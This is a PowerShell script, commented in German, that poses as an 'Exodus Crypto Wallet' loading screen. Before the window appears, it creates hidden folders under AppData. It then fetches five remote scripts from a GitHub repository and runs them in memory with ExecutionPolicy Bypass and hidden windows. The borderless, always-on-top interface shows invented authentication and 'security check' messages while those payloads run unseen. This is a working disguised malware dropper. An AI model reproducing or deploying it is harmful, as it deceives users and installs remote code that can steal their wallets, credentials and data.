Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# TLS 1.2 für GitHub
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

# ==================== DIREKTER DOWNLOAD UND AUSFÜHRUNG (KEINE JOBS/FUNKTIONEN!) ====================
# Flexibler Pfad pro User (nur für Logs)
$baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
$operationDir = Join-Path $baseDir "operation"
$targetDir = Join-Path $operationDir "System"

# Verstecken-Funktion (einfach, inline)
if (-not (Test-Path $operationDir)) { New-Item -ItemType Directory -Path $operationDir -Force | Out-Null; Set-ItemProperty -Path $operationDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }
if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null; Set-ItemProperty -Path $targetDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }

# Log-Datei (hidden)
$logPath = Join-Path $targetDir "download_errors.log"
if (Test-Path $logPath) { Set-ItemProperty -Path $logPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }

# Scripts-Liste mit Raw-URLs
$scripts = @(
    "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1",
    "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1",
    "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1",
    "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1",
    "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"
)

# Direkte Schleife: Jeder URL in-memory exec (keine Funktionen!)
foreach ($url in $scripts) {
    $fileName = Split-Path $url -Leaf  # z.B. "WindowsTransmitter.ps1"
    try {
        Write-Host "Starte: $fileName (Debug – entferne später)"  # Debug
        # Nested PS für hidden Exec (dein manueller Stil!)
        $execCmd = "iwr '$url' -UseBasicParsing -ErrorAction SilentlyContinue | % { iex `$_.Content -ErrorAction SilentlyContinue }"
        $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", $execCmd)
        Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null  # BG-Start, kein Wait
        
        # Log Erfolg
        Add-Content -Path $logPath -Value "$(Get-Date): SUCCESS $fileName gestartet" -ErrorAction SilentlyContinue
        Write-Host "SUCCESS: $fileName gestartet (im BG)"  # Debug
    } catch {
        $errorMsg = "Fehler bei $fileName`: $($_.Exception.Message)"
        Add-Content -Path $logPath -Value "$(Get-Date): $errorMsg" -ErrorAction SilentlyContinue
        Write-Host $errorMsg  # Debug
    }
    Start-Sleep -Milliseconds 500  # Pause
}

Write-Host "Alle Scripts gestartet. GUI lädt..."  # Debug-Signal

# ==================== HAUPTFENSTER (dein GUI, unverändert) ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true

# Gradient-Header
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font("Segoe UI", 44, [System.Drawing.FontStyle]::Bold)
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED")
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $colorStart, $colorEnd, [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)

# GIF
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
try {
    Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing
} catch {
    Write-Host "GIF-Download fehlgeschlagen: $_" -ErrorAction SilentlyContinue
}
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)

# Loading Label
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$loadingLabel.Text = "Authenticating device..."
$form.Controls.Add($loadingLabel)

# Progress Bars
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# Status Label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$statusLabel.Text = "Performing background security checks..."
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# Timer & Animation (unverändert)
$marqueePos = 0
$percent = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000
$authPhaseDuration = 15000
$inAuthPhase = $true
$authStartTime = Get-Date
$statuses = @("Loading wallet...", "Connecting to secure servers...", "Decrypting local data...", "Fetching asset metadata...", "Syncing blockchain nodes...", "Preparing secure environment...", "Loading portfolio assets...", "Almost there...")
$statusIndex = 0
$dotCount = 0

$timer.Add_Tick({
    if ($form.IsDisposed) { $timer.Stop(); return }
    if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
        $inAuthPhase = $false
        $loadingLabel.Text = "Loading wallet"
        $statusLabel.Text = $statuses[0]
    }
    $marqueePos += 5
    if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
    $progressBar2.Left = $marqueePos
    if (-not $inAuthPhase -and $percent -lt 100) {
        $percent += 0.3
        $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
    }
})

$labelTimer.Add_Tick({
    if ($form.IsDisposed) { $labelTimer.Stop(); return }
    if (-not $inAuthPhase) {
        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]
    }
})

$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
    if (Test-Path $gifPath) { Remove-Item $gifPath -Force -ErrorAction SilentlyContinue }
})

$timer.Start()
$labelTimer.Start()
$form.Add_Shown({ $form.Activate(); $form.Cursor = [System.Windows.Forms.Cursors]::Default })
$form.ShowDialog() | Out-Null
